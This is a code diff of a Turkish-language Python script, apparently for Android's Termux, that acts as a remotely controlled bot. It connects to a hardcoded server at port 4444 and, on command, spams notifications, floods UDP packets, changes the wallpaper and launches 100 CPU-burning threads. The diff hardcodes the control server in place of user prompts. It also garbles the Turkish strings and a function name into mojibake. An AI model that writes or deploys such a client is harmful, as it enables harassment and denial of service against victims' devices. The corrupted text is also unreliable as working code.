@@ -9,8 +9,6 @@ try:
 except ImportError:
     os.system("pip install termux")
 
-from termux import Notification
-
 def bildirim_spam():
     for i in range(10):
         os.system(f'termux-notification --title "Fsociety" --content "Bildirim {i+1}"')
@@ -29,22 +27,23 @@ def arka_plan_degistir(dosya_adi):
     tam_yol = f"/sdcard/Download/{dosya_adi}"
     if os.path.exists(tam_yol):
         os.system(f"termux-wallpaper -f {tam_yol}")
-        os.system('termux-toast -b green "Duvar kağıdı ayarlandı"')
+        os.system('termux-toast -b green "Duvar kaÄŸÄ±dÄ± ayarlandÄ±"')
     else:
-        os.system('termux-toast -b red "Dosya bulunamadı"')
+        os.system('termux-toast -b red "Dosya bulunamadÄ±"')
 
 def yuk_bindir():
-    def yük():
+    def yÃ¼k():
         while True:
             pass
     for _ in range(100):
-        threading.Thread(target=yük, daemon=True).start()
+        threading.Thread(target=yÃ¼k, daemon=True).start()
+
+host = "192.168.1.100"  # Server IP
+port = 4444             # Sabit port
 
 s = socket.socket()
-host = input("Sunucu IP >> ")
-port = int(input("Port >> "))
 s.connect((host, port))
-print(f"[+] Bağlandı: {host}:{port}")
+print(f"[+] BaÄŸlandÄ±: {host}:{port}")
 
 while True:
     try:
@@ -53,17 +52,17 @@ while True:
             break
         elif komut == "bildirim-spam":
             bildirim_spam()
-            s.send("[✓] Bildirim spam gönderildi.".encode())
+            s.send("[âœ“] Bildirim spam gÃ¶nderildi.".encode())
         elif komut == "udp-spam":
             udp_spam()
-            s.send("[✓] UDP paketleri gönderildi.".encode())
+            s.send("[âœ“] UDP paketleri gÃ¶nderildi.".encode())
         elif komut.startswith("arka-plan "):
             dosya_adi = komut.split(" ", 1)[1]
             arka_plan_degistir(dosya_adi)
-            s.send("[✓] Duvar kağıdı değiştirildi.".encode())
-        elif komut == "yükle":
+            s.send("[âœ“] Duvar kaÄŸÄ±dÄ± deÄŸiÅŸtirildi.".encode())
+        elif komut == "yÃ¼kle":
             yuk_bindir()
-            s.send("[✓] Yükleme başlatıldı.".encode())
+            s.send("[âœ“] YÃ¼kleme baÅŸlatÄ±ldÄ±.".encode())
         else:
             s.send("[X] Bilinmeyen komut.".encode())
     except Exception as e:
